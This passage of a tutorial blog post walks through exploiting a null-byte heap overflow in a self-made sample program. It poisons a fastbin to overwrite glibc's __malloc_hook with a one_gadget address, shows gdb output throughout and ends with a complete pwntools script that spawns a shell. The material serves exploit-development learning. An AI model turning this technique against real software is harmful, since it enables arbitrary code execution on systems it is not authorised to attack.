+Now we only need to calculate the offset …
+
+``` bash
+gdb-peda$ i proc mappings 
+process 8818
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+            0x400000           0x401000     0x1000        0x0 /home/xerus/pwn/heap/dev/heap
+            0x601000           0x602000     0x1000     0x1000 /home/xerus/pwn/heap/dev/heap
+            0x602000           0x603000     0x1000     0x2000 /home/xerus/pwn/heap/dev/heap
+            0x603000           0x625000    0x22000        0x0 [heap]
+      0x7ffff7a0d000     0x7ffff7bcd000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
+...
+gdb-peda$ p 0x7ffff7dd1aed - 0x7ffff7a0d000
+$1 = 0x3c4aed
+```
+
+… and use our previously leaked libc base-address to overwrite the `FD` of the free’d `chunk_BBB` with the resulting address instead of `0xdeadbeef`:
+
+``` python
+# create another new chunk (chunk_FFF) within the big free chunk which
+# will set the fd of the free'd fastbin chunk_BBB to the address of hook
+hook_offset = 0x3c4aed
+hook        = libc_base + hook_offset
+create(0x108, 'F'*0x100 + p64(hook)) # new_idx = 0
+```
+
+A quick glance at the heap shows that the `FD` is now set to `0x7ffff7dd1aed`:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/dev-11.png)
+
+At next we need to do a little bit cleanup again and restore the `size+flags` field of the free’d `chunk_BBB`:
+
+``` python
+# restore the size field (0x70) of the free'd chunk_BBB
+for i in range(0xfe, 0xf7, -1):
+  delete(0)
+  create(i+8, 'F'*i + p64(0x70)) # new_idx = 0
+```
+
+Then we can recreate the chunk:
+
+``` python
+# now recreate chunk_BBB
+# -> this will add the address in fd (hook) to the fastbin-list
+create(0x68, 'B'*0x68)
+```
+
+Our allocation fits the size of the fastbin where the formerly free’d `chunk_BBB` has been stored. When the free chunk is returned from the fastbin, the libc checks if the `FD` of the free chunk contains another free chunk. That is the case since we have overwritten the `FD`. This address is now the new head of the fastbin:
+
+``` bash
+gdb-peda$ p main_arena 
+$1 = {
+  mutex = 0x0, 
+  flags = 0x0, 
+  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7dd1aed <_IO_wide_data_0+301>, 0x0, 0x0, 0x0, 0x0}, 
+  top = 0x6042a0, 
+  last_remainder = 0x604120, 
+  bins = {0x604120, 0x604120, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b98 <main_arena+120>, 
+    0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 
+    0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bd8 <main_arena+184>, 
+...
+```
+
+The next allocation with a size equal to the fastbin-size (`0x70`) will return the address `0x7ffff7dd1aed + 0x10`. At offset `+0x13` the `__malloc_hook` is stored. If we put an address of our choice there and do another allocation (call to `malloc`), this address is called:
+
+``` python
+# the next allocation with a size equal to chunk_BBB (0x70 = fastbin)
+# will return the address of hook from the fastbin-list
+foo = 0xb00bb00b
+create(0x68, 0x13*'G'+p64(foo)+0x4d*'G')
+```
+
+After verifying that the `__malloc_hook` was set …
+
+``` bash
+gdb-peda$ x/xg &__malloc_hook
+0x7ffff7dd1b10 <__malloc_hook>:	0x00000000b00bb00b
+```
+
+… we can trigger the hook by an arbitrary allocation:
+
+``` python
+# since __malloc_hook is set now, the next call to malloc will
+# call the address stored there (foo)
+create(0x20, 'trigger __malloc_hook')
+```
+
+We get a segmentation fault and successfully control the instruction pointer:
+
+``` bash
+Program received signal SIGSEGV, Segmentation fault.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0xb00bb00b 
+RBX: 0x0 
+RCX: 0x7ffff7b04260 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
+RDX: 0x20 (' ')
+RSI: 0x400a3c (<create+316>:	mov    rcx,rax)
+RDI: 0x10 
+RBP: 0x7fffffffe4b0 --> 0x7fffffffe4d0 --> 0x400bd0 (<__libc_csu_init>:	push   r15)
+RSP: 0x7fffffffe088 --> 0x400a3c (<create+316>:	mov    rcx,rax)
+RIP: 0xb00bb00b 
+R8 : 0x7ffff7fdc700 (0x00007ffff7fdc700)
+R9 : 0x6 
+R10: 0x7ffff7b845e0 --> 0x2000200020002 
+R11: 0x246 
+R12: 0x400740 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffe5b0 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0xb00bb00b
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe088 --> 0x400a3c (<create+316>:	mov    rcx,rax)
+0008| 0x7fffffffe090 --> 0x10f7fdd000 
+0016| 0x7fffffffe098 --> 0x400000004 
+0024| 0x7fffffffe0a0 ("trigger exploit\n")
+0032| 0x7fffffffe0a8 ("exploit\n")
+0040| 0x7fffffffe0b0 --> 0xb00bb00b474700 
+0048| 0x7fffffffe0b8 --> 0x4747474747000000 ('')
+0056| 0x7fffffffe0c0 ('G' <repeats 72 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00000000b00bb00b in ?? ()
+```
+
+------------------------------------------------------------------------
+
+## One Gadget
+
+After we have successfully leaked the libc base-address and also control the instruction pointer, our exploit is almost done. At last we only have to spawn a shell.
+
+As you may have noticed from the `gdb` output of the segmentation fault, we also control parts of the stack because the entered data is stored there (output above: `trigger exploit`). In combination with a pivoting gadget and another few gadgets we could use this to call `system` or even make a syscall to `execve`. Nevertheless I decided to use the very handy [One Gadget tool](https://github.com/david942j/one_gadget). This tool provides offsets within a specific libc which will lead to a call to `execve('/bin/sh', NULL, NULL)`:
+
+``` bash
+xerus@xerus:~/pwn/heap$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
+0x45216	execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a	execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4	execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147	execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+```
+
+As you can see, there are some constraints, which must be met for the gadget to work.
+
+We can simply test one gadget after another and set a breakpoint in order to see if the constraints are met:
+
+``` python
+oneshot_offset = 0x45216
+#oneshot_offset = 0x4526a
+#oneshot_offset = 0xf02a4
+#oneshot_offset = 0xf1147
+
+# the next allocation with a size equal to chunk_BBB (0x70 = fastbin)
+# will return the address of hook from the fastbin-list
+# --> store the address of oneshot in __malloc_hook
+oneshot = libc_base + oneshot_offset
+create(0x68, 0x13*'G'+p64(oneshot)+0x4d*'G')
+
+# since __malloc_hook is set now, the next call to malloc will
+# call the address stored there (oneshot)
+create(0x20, 'trigger exploit')
+```
+
+The constraint of the first gadget is `rax == NULL`. Let’s give it a try:
+
+``` bash
+gdb-peda$ b *(0x7ffff7a0d000 + 0x45216)
+Haltepunkt 1 at 0x7ffff7a52216: file ../sysdeps/posix/system.c, line 130.
+gdb-peda$ c
+Continuing.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x7ffff7a52216 (<do_system+1014>:	lea    rsi,[rip+0x381343]        # 0x7ffff7dd3560 <intr>)
+RBX: 0x0 
+RCX: 0x7ffff7b04260 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
+RDX: 0x20 (' ')
+RSI: 0x400a3c (<create+316>:	mov    rcx,rax)
+RDI: 0x10 
+RBP: 0x7fffffffe4b0 --> 0x7fffffffe4d0 --> 0x400bd0 (<__libc_csu_init>:	push   r15)
+RSP: 0x7fffffffe088 --> 0x400a3c (<create+316>:	mov    rcx,rax)
+RIP: 0x7ffff7a52216 (<do_system+1014>:	lea    rsi,[rip+0x381343]        # 0x7ffff7dd3560 <intr>)
+R8 : 0x7ffff7fdc700 (0x00007ffff7fdc700)
+R9 : 0x6 
+R10: 0x7ffff7b845e0 --> 0x2000200020002 
+R11: 0x246 
+R12: 0x400740 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffe5b0 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ffff7a52205 <do_system+997>:	call   0x7ffff7a426f0 <__GI___sigaction>
+   0x7ffff7a5220a <do_system+1002>:	jmp    0x7ffff7a52189 <do_system+873>
+   0x7ffff7a5220f <do_system+1007>:	lea    rax,[rip+0x147b46]        # 0x7ffff7b99d5c
+=> 0x7ffff7a52216 <do_system+1014>:	lea    rsi,[rip+0x381343]        # 0x7ffff7dd3560 <intr>
+   0x7ffff7a5221d <do_system+1021>:	xor    edx,edx
+   0x7ffff7a5221f <do_system+1023>:	mov    edi,0x2
+   0x7ffff7a52224 <do_system+1028>:	mov    QWORD PTR [rsp+0x40],rbx
+   0x7ffff7a52229 <do_system+1033>:	mov    QWORD PTR [rsp+0x48],0x0
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe088 --> 0x400a3c (<create+316>:	mov    rcx,rax)
+0008| 0x7fffffffe090 --> 0x10f7fdd000 
+0016| 0x7fffffffe098 --> 0x400000004 
+0024| 0x7fffffffe0a0 ("trigger exploit\n")
+0032| 0x7fffffffe0a8 ("exploit\n")
+0040| 0x7fffffffe0b0 --> 0xfff7a52216474700 
+0048| 0x7fffffffe0b8 --> 0x474747474700007f 
+0056| 0x7fffffffe0c0 ('G' <repeats 72 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, do_system (line=0x0) at ../sysdeps/posix/system.c:130
+130	../sysdeps/posix/system.c: Datei oder Verzeichnis nicht gefunden.
+```
+
+`RAX` contains the value `0x7ffff7a52216`. Thus the constraint is not met and the gadget will not work.
+
+Let’s proceed with the second one with the constraint `[rsp+0x30] == NULL`:
+
+``` python
+#oneshot_offset = 0x45216
+oneshot_offset = 0x4526a
+#oneshot_offset = 0xf02a4
+#oneshot_offset = 0xf1147
+...
+```
+
+``` bash
+gdb-peda$ b *(0x7ffff7a0d000 + 0x4526a)
+Haltepunkt 1 at 0x7ffff7a5226a: file ../sysdeps/posix/system.c, line 136.
+gdb-peda$ c
+Continuing.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x7ffff7a5226a (<do_system+1098>:	mov    rax,QWORD PTR [rip+0x37ec47]        # 0x7ffff7dd0eb8)
+RBX: 0x0 
+RCX: 0x7ffff7b04260 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
+RDX: 0x20 (' ')
+RSI: 0x400a3c (<create+316>:	mov    rcx,rax)
+RDI: 0x10 
+RBP: 0x7fffffffe4b0 --> 0x7fffffffe4d0 --> 0x400bd0 (<__libc_csu_init>:	push   r15)
+RSP: 0x7fffffffe088 --> 0x400a3c (<create+316>:	mov    rcx,rax)
+RIP: 0x7ffff7a5226a (<do_system+1098>:	mov    rax,QWORD PTR [rip+0x37ec47]        # 0x7ffff7dd0eb8)
+R8 : 0x7ffff7fdc700 (0x00007ffff7fdc700)
+R9 : 0x6 
+R10: 0x7ffff7b845e0 --> 0x2000200020002 
+R11: 0x246 
+R12: 0x400740 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffe5b0 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ffff7a5225d <do_system+1085>:	mov    rsi,r12
+   0x7ffff7a52260 <do_system+1088>:	mov    edi,0x2
+   0x7ffff7a52265 <do_system+1093>:	call   0x7ffff7a42720 <__sigprocmask>
+=> 0x7ffff7a5226a <do_system+1098>:	mov    rax,QWORD PTR [rip+0x37ec47]        # 0x7ffff7dd0eb8
+   0x7ffff7a52271 <do_system+1105>:	lea    rdi,[rip+0x147adf]        # 0x7ffff7b99d57
+   0x7ffff7a52278 <do_system+1112>:	lea    rsi,[rsp+0x30]
+   0x7ffff7a5227d <do_system+1117>:	mov    DWORD PTR [rip+0x381219],0x0        # 0x7ffff7dd34a0 <lock>
+   0x7ffff7a52287 <do_system+1127>:	mov    DWORD PTR [rip+0x381213],0x0        # 0x7ffff7dd34a4 <sa_refcntr>
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe088 --> 0x400a3c (<create+316>:	mov    rcx,rax)
+0008| 0x7fffffffe090 --> 0x10f7fdd000 
+0016| 0x7fffffffe098 --> 0x400000004 
+0024| 0x7fffffffe0a0 ("trigger exploit\n")
+0032| 0x7fffffffe0a8 ("exploit\n")
+0040| 0x7fffffffe0b0 --> 0xfff7a5226a474700 
+0048| 0x7fffffffe0b8 --> 0x474747474700007f 
+0056| 0x7fffffffe0c0 ('G' <repeats 72 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, do_system (line=0x0) at ../sysdeps/posix/system.c:136
+136	../sysdeps/posix/system.c: Datei oder Verzeichnis nicht gefunden.
+gdb-peda$ x/xg $rsp+0x30
+0x7fffffffe0b8:	0x474747474700007f
+```
+
+`[rsp+0x30]` contains the value `0x474747474700007f`. Thus the constraint is not met. The `0x474747..` seems to be the `GGG...` we entered as data. We could change this to null-bytes, but we do not control the full quadword. So let’s just proceed with the third gadget and the constraint `[rsp+0x50] == NULL`:
+
+``` python
+#oneshot_offset = 0x45216
+#oneshot_offset = 0x4526a
+oneshot_offset = 0xf02a4
+#oneshot_offset = 0xf1147
+...
+```
+
+``` bash
+gdb-peda$ b *(0x7ffff7a0d000 + 0xf02a4)
+Haltepunkt 1 at 0x7ffff7afd2a4: file wordexp.c, line 876.
+gdb-peda$ c
+Continuing.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x7ffff7afd2a4 (<exec_comm+1140>:	mov    rax,QWORD PTR [rip+0x2d3c0d]        # 0x7ffff7dd0eb8)
+RBX: 0x0 
+RCX: 0x7ffff7b04260 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
+RDX: 0x20 (' ')
+RSI: 0x400a3c (<create+316>:	mov    rcx,rax)
+RDI: 0x10 
+RBP: 0x7fffffffe4b0 --> 0x7fffffffe4d0 --> 0x400bd0 (<__libc_csu_init>:	push   r15)
+RSP: 0x7fffffffe088 --> 0x400a3c (<create+316>:	mov    rcx,rax)
+RIP: 0x7ffff7afd2a4 (<exec_comm+1140>:	mov    rax,QWORD PTR [rip+0x2d3c0d]        # 0x7ffff7dd0eb8)
+R8 : 0x7ffff7fdc700 (0x00007ffff7fdc700)
+R9 : 0x6 
+R10: 0x7ffff7b845e0 --> 0x2000200020002 
+R11: 0x246 
+R12: 0x400740 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffe5b0 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ffff7afd296 <exec_comm+1126>:	call   0x7ffff7a46d00 <__unsetenv>
+   0x7ffff7afd29b <exec_comm+1131>:	mov    edi,DWORD PTR [rsp+0x40]
+   0x7ffff7afd29f <exec_comm+1135>:	call   0x7ffff7b048e0 <close>
+=> 0x7ffff7afd2a4 <exec_comm+1140>:	mov    rax,QWORD PTR [rip+0x2d3c0d]        # 0x7ffff7dd0eb8
+   0x7ffff7afd2ab <exec_comm+1147>:	lea    rsi,[rsp+0x50]
+   0x7ffff7afd2b0 <exec_comm+1152>:	lea    rdi,[rip+0x9caa0]        # 0x7ffff7b99d57
+   0x7ffff7afd2b7 <exec_comm+1159>:	mov    rdx,QWORD PTR [rax]
+   0x7ffff7afd2ba <exec_comm+1162>:	call   0x7ffff7ad9770 <execve>
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe088 --> 0x400a3c (<create+316>:	mov    rcx,rax)
+0008| 0x7fffffffe090 --> 0x10f7fdd000 
+0016| 0x7fffffffe098 --> 0x400000004 
+0024| 0x7fffffffe0a0 ("trigger exploit\n")
+0032| 0x7fffffffe0a8 ("exploit\n")
+0040| 0x7fffffffe0b0 --> 0xfff7afd2a4474700 
+0048| 0x7fffffffe0b8 --> 0x474747474700007f 
+0056| 0x7fffffffe0c0 ('G' <repeats 72 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, exec_comm_child (noexec=<optimized out>, showerr=<optimized out>, fildes=0x7fffffffe0c8, 
+    comm=0xa74696f6c707865 <error: Cannot access memory at address 0xa74696f6c707865>) at wordexp.c:876
+876	wordexp.c: Datei oder Verzeichnis nicht gefunden.
+gdb-peda$ x/xg $rsp+0x50
+0x7fffffffe0d8:	0x4747474747474747
+```
+
+`[rsp+0x50]` contains the value `0x4747474747474747` and thus the constraint is not met. But this time we control the full quadword. So let’s change the `GGG..` into null-bytes …
+
+``` python
+# the next allocation with a size equal to chunk_BBB (0x70 = fastbin)
+# will return the address of hook from the fastbin-list
+# --> store the address of oneshot in __malloc_hook
+oneshot = libc_base + oneshot_offset
+create(0x68, 0x13*'G'+p64(oneshot)+0x4d*'\x00')
+
+# since __malloc_hook is set now, the next call to malloc will
+# call the address stored there (oneshot)
+create(0x20, 'trigger exploit')
+```
+
+… and verify that `[rsp+0x50]` is null:
+
+``` bash
+gdb-peda$ b *(0x7ffff7a0d000 + 0xf02a4)
+Haltepunkt 1 at 0x7ffff7afd2a4: file wordexp.c, line 876.
+gdb-peda$ c
+Continuing.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x7ffff7afd2a4 (<exec_comm+1140>:	mov    rax,QWORD PTR [rip+0x2d3c0d]        # 0x7ffff7dd0eb8)
+RBX: 0x0 
+RCX: 0x7ffff7b04260 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
+RDX: 0x20 (' ')
+RSI: 0x400a3c (<create+316>:	mov    rcx,rax)
+RDI: 0x10 
+RBP: 0x7fffffffe4b0 --> 0x7fffffffe4d0 --> 0x400bd0 (<__libc_csu_init>:	push   r15)
+RSP: 0x7fffffffe088 --> 0x400a3c (<create+316>:	mov    rcx,rax)
+RIP: 0x7ffff7afd2a4 (<exec_comm+1140>:	mov    rax,QWORD PTR [rip+0x2d3c0d]        # 0x7ffff7dd0eb8)
+R8 : 0x7ffff7fdc700 (0x00007ffff7fdc700)
+R9 : 0x6 
+R10: 0x7ffff7b845e0 --> 0x2000200020002 
+R11: 0x246 
+R12: 0x400740 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffe5b0 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ffff7afd296 <exec_comm+1126>:	call   0x7ffff7a46d00 <__unsetenv>
+   0x7ffff7afd29b <exec_comm+1131>:	mov    edi,DWORD PTR [rsp+0x40]
+   0x7ffff7afd29f <exec_comm+1135>:	call   0x7ffff7b048e0 <close>
+=> 0x7ffff7afd2a4 <exec_comm+1140>:	mov    rax,QWORD PTR [rip+0x2d3c0d]        # 0x7ffff7dd0eb8
+   0x7ffff7afd2ab <exec_comm+1147>:	lea    rsi,[rsp+0x50]
+   0x7ffff7afd2b0 <exec_comm+1152>:	lea    rdi,[rip+0x9caa0]        # 0x7ffff7b99d57
+   0x7ffff7afd2b7 <exec_comm+1159>:	mov    rdx,QWORD PTR [rax]
+   0x7ffff7afd2ba <exec_comm+1162>:	call   0x7ffff7ad9770 <execve>
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe088 --> 0x400a3c (<create+316>:	mov    rcx,rax)
+0008| 0x7fffffffe090 --> 0x10f7fdd000 
+0016| 0x7fffffffe098 --> 0x400000004 
+0024| 0x7fffffffe0a0 ("trigger exploit\n")
+0032| 0x7fffffffe0a8 ("exploit\n")
+0040| 0x7fffffffe0b0 --> 0xfff7afd2a4474700 
+0048| 0x7fffffffe0b8 --> 0x7f 
+0056| 0x7fffffffe0c0 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, exec_comm_child (noexec=<optimized out>, showerr=<optimized out>, fildes=0x7fffffffe0c8, 
+    comm=0xa74696f6c707865 <error: Cannot access memory at address 0xa74696f6c707865>) at wordexp.c:876
+876	wordexp.c: Datei oder Verzeichnis nicht gefunden.
+gdb-peda$ x/xg $rsp+0x50
+0x7fffffffe0d8:	0x0000000000000000
+```
+
+Now `[rsp+0x50]` contains the value `0x0000000000000000` and thus the constraint is met!
+
+------------------------------------------------------------------------
+
+## Final Exploit
+
+The final exploit-script:
+
+``` python
+xerus@xerus:~/pwn/heap$ cat exploit.py 
+#!/usr/bin/env python
+
+from pwn import *
+
+p = process('./heap')
+
+def create(size, data):
+  p.sendlineafter('>', str(1))
+  p.sendlineafter('size: ', str(size))
+  p.sendlineafter('data: ', data)
+
+def delete(idx):
+  p.sendlineafter('>', str(2))
+  p.sendlineafter('idx: ', str(idx))
+
+def printData(idx):
+  p.sendlineafter('>', str(3))
+  p.sendlineafter('idx: ', str(idx))
+  p.recvuntil('data: ')
+  ret = p.recvuntil('\n')
+  return ret[:-1]
+
+
+libc_offset    = 0x3c4b78
+hook_offset    = 0x3c4aed
+#oneshot_offset = 0x45216
+#oneshot_offset = 0x4526a
+oneshot_offset = 0xf02a4
+#oneshot_offset = 0xf1147
+
+
+create(0xf8, 'A'*0xf8) # chunk_AAA, idx = 0
+create(0x68, 'B'*0x68) # chunk_BBB, idx = 1
+create(0xf8, 'C'*0xf8) # chunk_CCC, idx = 2
+create(0x10, 'D'*0x10) # chunk_DDD, idx = 3
+
+# chunk_AAA will be a valid free chunk (containing libc-addresses in FD/BK)
+delete(0)
+
+# leverage off-by-one vuln in chunk_BBB:
+# overwrite prev_inuse bit of following chunk (chunk_CCC)
+delete(1)
+create(0x68, 'B'*0x68) # chunk_BBB, new idx = 0
+
+# set prev_size of following chunk (chunk_CCC) to 0x170
+for i in range(0x66, 0x5f, -1):
+  delete(0)
+  create(i+2, 'B'*i + '\x70\x01') # chunk_BBB, new_idx = 0
+
+# now delete chunk_CCC to trigger consolidation with the fakechunk (0x170)
+# after this we have got a big free chunk (0x270) overlapping with chunk_BBB
+delete(2)
+
+# create a new chunk (chunk_EEE) within the big free chunk to push
+# the libc-addresses (fd/bk) down to chunk_BBB
+create(0xf6, 'E'*0xf6) # chunk_EEE, new_idx = 1
+
+# the content of chunk_BBB now contains fd/bk (libc-addresses)
+# just print the chunk (idx = 0)
+libc_leak = printData(0)
+libc_leak = unpack(libc_leak + (8-len(libc_leak))*'\x00', 64)
+libc_base = libc_leak - libc_offset
+log.info('libc_base: ' + hex(libc_base))
+
+# restore the size field (0x70) of chunk_BBB
+for i in range(0xfd, 0xf7, -1):
+  delete(1)
+  create(i+1, 'E'*i + '\x70') # chunk_EEE, new_idx = 1
+
+# free chunk_BBB: the address of the chunk is added to the fastbin-list
+delete(0)
+# free chunk_EEE
+delete(1)
+
+# create another new chunk (chunk_FFF) within the big free chunk which
+# will set the fd of the free'd fastbin chunk_BBB to the address of hook
+hook = libc_base + hook_offset
+create(0x108, 'F'*0x100 + p64(hook)) # new_idx = 0
+
+# restore the size field (0x70) of the free'd chunk_BBB
+for i in range(0xfe, 0xf7, -1):
+  delete(0)
+  create(i+8, 'F'*i + p64(0x70)) # new_idx = 0
+
+# now recreate chunk_BBB
+# -> this will add the address in fd (hook) to the fastbin-list
+create(0x68, 'B'*0x68)
+
+# the next allocation with a size equal to chunk_BBB (0x70 = fastbin)
+# will return the address of hook from the fastbin-list
+# --> store the address of oneshot in __malloc_hook
+oneshot = libc_base + oneshot_offset
+create(0x68, 0x13*'G'+p64(oneshot)+0x4d*'\x00')
+
+# since __malloc_hook is set now, the next call to malloc will
+# call the address stored there (oneshot)
+create(0x20, 'trigger exploit')
+p.interactive()
+```
+
+Now we can turn ASLR on again …
+
+``` bash
+xerus@xerus:~/pwn/heap$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space 
+2
+```
+
+… and run our script to spawn a shell:
+
+``` bash
+xerus@xerus:~/pwn/heap$ ./exploit.py 
+[+] Starting local process './heap': pid 32054
+[*] libc_base: 0x7fe42a0d9000
+[*] Switching to interactive mode
+$ id
+uid=1000(xerus) gid=1000(xerus) Gruppen=1000(xerus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+```
+
+Done 🙂 A single null-byte overflow on the heap enabled us to fully exploit the vulnerable sample program.
+
+Thanks for reading the article! Any feedback or comment is welcome.
+
+Post Views: 50,045
